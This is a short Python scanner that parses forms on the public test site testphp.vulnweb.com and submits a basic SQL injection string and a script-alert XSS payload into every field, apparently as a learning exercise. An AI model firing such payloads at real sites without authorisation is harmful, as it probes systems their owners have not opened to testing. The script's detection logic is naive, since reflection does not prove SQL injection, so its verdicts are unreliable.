import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Target website
url = "http://testphp.vulnweb.com"

print("[*] Scanning", url)

try:
    response = requests.get(url)
    print("[+] Status Code:", response.status_code)
    print("[+] Server Header:", response.headers.get("Server"))
    print("[+] X-Powered-By:", response.headers.get("X-Powered-By"))
except Exception as e:
    print("[-] Failed to connect:", e)
    exit()

# Basic payloads
sql_payload = "' OR '1'='1"
xss_payload = "<script>alert('xss')</script>"

def get_forms(target_url):
    soup = BeautifulSoup(requests.get(target_url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def test_payloads(url, forms, payload):
    for form in forms:
        details = form_details(form)
        data = {}
        for input in details["inputs"]:
            if input["name"]:
                data[input["name"]] = payload
        target = urljoin(url, details["action"])
        if details["method"] == "post":
            res = requests.post(target, data=data)
        else:
            res = requests.get(target, params=data)
        if payload in res.text:
            return True
    return False

# Get forms from page
forms = get_forms(url)

# SQLi Test
if test_payloads(url, forms, sql_payload):
    print("[!] SQL Injection vulnerability detected!")
else:
    print("[+] No SQL Injection detected.")

# XSS Test
if test_payloads(url, forms, xss_payload):
    print("[!] XSS vulnerability detected!")
else:
    print("[+] No XSS vulnerability detected.")
